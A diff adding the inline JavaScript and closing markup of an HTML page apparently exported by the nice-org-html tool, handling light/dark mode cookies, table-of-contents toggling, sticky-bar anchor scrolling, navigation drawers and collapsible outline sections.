+const toc = document.getElementById("table-of-contents");
+
+// Get and parse options passed in cookie string
+const optCookie = document.cookie.split('; ').find(r => r.startsWith('options'));
+const options = {};
+if (optCookie) {
+  optCookie.split('=')[1].split('__').forEach(pair => {
+    const [key, val] = pair.split(':');
+    if (key && val) {
+      options[key] = val;
+    }
+  })
+}
+
+// Move sticky control bar (injected within preamble)
+document.body.insertBefore(controls, content);
+
+// Mode handling
+function getMode() {
+  let cookie = document.cookie.split('; ').find(r => r.startsWith('mode'))
+  return cookie && cookie.split("=")[1];
+}
+
+function setMode(mode) {
+  document.body.dataset.mode = mode;
+  let thmCookie = document.cookie.split('; ').find(r => r.startsWith(mode));
+  document.body.dataset.theme = thmCookie ? thmCookie.split('=')[1] : 'unknown';
+  toggleModeBtn.innerHTML = (mode === 'light') ? '&#9789;' : '&#9788;';
+  document.cookie = 'mode=' + mode;
+}
+
+// Initially, set mode based on stored cookie
+let mode = getMode();
+if (mode && ["light", "dark"].includes(mode)) {
+  setMode(mode);
+} else {  
+  let prop = "prefers-color-scheme";
+  let pref = (mode === "query") && window.matchMedia &&
+    ["light", "dark"].find(s => window.matchMedia(`(${prop}: ${s})`).matches);
+  setMode(pref || "dark"); // fallback: dark
+}
+
+// Mode toggling
+toggleModeBtn.addEventListener('click', () => {
+  setMode(document.body.dataset.mode === 'dark' ? 'light' : 'dark');
+})
+
+
+// Jump to top
+let scrollY = document.documentElement.scrollTop;
+window.addEventListener('scroll', () => {
+  let atTop = document.documentElement.scrollTop <= preamble.offsetHeight;
+  gotoTopBtn.dataset.show = !atTop + "";
+});
+gotoTopBtn.addEventListener('click', () => {
+  window.scrollTo({
+    top: 0,
+    behavior: "smooth"
+  });
+})
+
+// Table-of-contents toggling
+if (toc) {
+  toggleTocBtn.dataset.show = 'true';
+  toggleTocBtn.addEventListener('click', () => {
+    let showingToc = document.body.dataset.toc;
+    scrollY = showingToc ? scrollY : document.documentElement.scrollTop;
+    if (showingToc) {
+      document.body.dataset.toc = '';
+      document.documentElement.scrollTop = scrollY;
+    } else {
+      let tocHeight =
+	Math.max(
+	  window.innerHeight - controls.offsetHeight,
+	  toc.offsetHeight
+	);
+      const header = document.getElementById("injected-header");
+      if (header && (scrollY > header.offsetHeight)) {
+	document.documentElement.scrollTop = preamble.offsetHeight;
+      }
+      toc.style.height = `${tocHeight}px`;
+      document.body.dataset.toc = 'true';
+    }
+    toc.addEventListener('click', () => {
+      if (document.body.dataset.toc) {
+	document.body.dataset.toc = '';
+	document.documentElement.scrollTop = scrollY;
+      }
+    })
+  })
+};
+
+// Instrument anchor linking for sticky control bar
+document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+  anchor.addEventListener('click', (e) => {
+    e.preventDefault();
+    const targetId = e.currentTarget.getAttribute('href');
+    const target = document.querySelector(targetId);
+
+    setTimeout(() => {
+      const targetPos = target.getBoundingClientRect().top;
+      let offset = targetPos + document.documentElement.scrollTop;
+      offset -= controls.offsetHeight;
+      window.scrollTo({
+	top: offset,
+	behavior: "smooth"
+      });
+    }, 0);
+  });
+});
+
+function copyTextToClipboard(text) {
+  // Make invisible textarea
+  var textArea = document.createElement("textarea");
+  textArea.style.position = 'fixed';
+  textArea.style.top = 0;
+  textArea.style.left = 0;
+  textArea.style.width = '2em';
+  textArea.style.height = '2em';
+  textArea.style.padding = 0;
+  textArea.style.border = 'none';
+  textArea.style.outline = 'none';
+  textArea.style.boxShadow = 'none';
+  textArea.style.background = 'transparent';
+
+  // Copy contents into it
+  textArea.value = text;
+
+  // Try to copy from it to clipboard
+  document.body.appendChild(textArea);
+  textArea.focus();
+  textArea.select();
+  var res;
+  try {
+    res = document.execCommand('copy');
+  } catch (err) {
+    res = false;
+  }
+
+  // Remove invisible textarea
+  document.body.removeChild(textArea);
+
+  return res;
+}
+
+// Handle the default header / footer drawers
+const header = document.getElementById("generated-header");
+const footer = document.getElementById("generated-footer");
+
+if (header) {
+  let toggle = header.querySelector("header nav input.nav-toggle");
+  if (toggle) { toggle.checked = false; }
+}
+if (footer) {
+  let nav = footer.querySelector("nav");
+  let toggle = nav && nav.querySelector(".nav-toggle");
+  let navList = nav && nav.querySelector(".nav-list");
+  let navElem = navList && [...navList.querySelectorAll(".nav-item")];
+  let numLink = navElem && navElem.length;
+  if (numLink) {
+    toggle.checked = false;
+    toggle.addEventListener('change', () => {
+      if (toggle.checked) {
+	setTimeout(() => window.scrollTo({
+	  behavior: 'smooth',
+	  top: document.body.scrollHeight	  
+	}), 88);
+      }
+   });
+  }
+}
+
+function autoCompact() {
+  var anchor, links, overlap, trivial;
+  const domCompute = (node) => {
+    if (node) {
+      anchor = node.querySelector('.nav-title, .nav-author');
+      links = node.querySelector('.nav-list');
+      overlap = links.offsetLeft - 5 <= anchor.offsetLeft + anchor.offsetWidth;	
+      trivial = links.offsetLeft === anchor.offsetLeft;
+    }
+  };
+  let mediaMatch = window.matchMedia('(max-width: 768px)').matches;
+  [header, footer].forEach(e => {
+    if (e) {
+      if (mediaMatch) {
+	e.classList.add('compact');
+      } else {
+	domCompute(e);
+	if (overlap && !trivial) {
+	  e.classList.add('compact');
+	} else {	
+	  let clone = e.cloneNode(true);
+	  clone.style.top = '-2000px';
+	  clone.style.maxHeight = '0px';
+	  clone.classList.remove('compact');
+	  e.parentNode.insertBefore(clone, e);
+	  domCompute(clone);
+	  let toggle = e.querySelector('.nav-toggle');
+	  if (!overlap && toggle && !toggle.checked) {
+	    e.classList.remove('compact');
+	  }
+	  e.parentNode.removeChild(clone);
+	}
+      }
+    }
+  })
+}
+
+if ((header || footer)) {
+  if (options.hasOwnProperty('layout')) {
+    [header, footer].forEach(e => e ? e.classList.add(options.layout) : null);
+  } else {
+    autoCompact();
+    window.addEventListener('resize', autoCompact);
+  }
+}
+
+if (options.hasOwnProperty('src-lang') && options['src-lang'] == 't') {
+  let labels = [...document.querySelectorAll('.srcLangLabel')];
+  labels.forEach(l => l.style.display = 'inline-block');
+}
+
+if (options.hasOwnProperty('collapsing') && options.collapsing == 't') {
+  let levels = [2, 3, 4, 5, 6];
+  let containerPrefix = 'outline-container-';
+  levels.forEach(l => {
+    let containers = [...document.querySelectorAll(`.outline-${l}`)];
+    containers.forEach(c => {
+      let id = c.id.slice(containerPrefix.length);
+      let headline = document.getElementById(id);
+      let siblings = [...c.children].filter(child => child.id != id);
+      headline.classList.add('collapsible');
+      headline.addEventListener('click', () => {	
+	if (headline.classList.contains('collapsed')) {
+	  headline.classList.remove('collapsed');
+	  siblings.forEach(child => {
+	    child.classList.remove('hidden');
+	  });	  
+	} else {
+	  headline.classList.add('collapsed');
+	  siblings.forEach(child => {
+	    child.classList.add('hidden');
+	  });
+	}
+      })
+    })
+  })
+}
+/*]]>*/-->
+</script><div hidden>Generated by: https://github.com/ewantown/nice-org-html</div>
+</div>
+</body>
+</html>
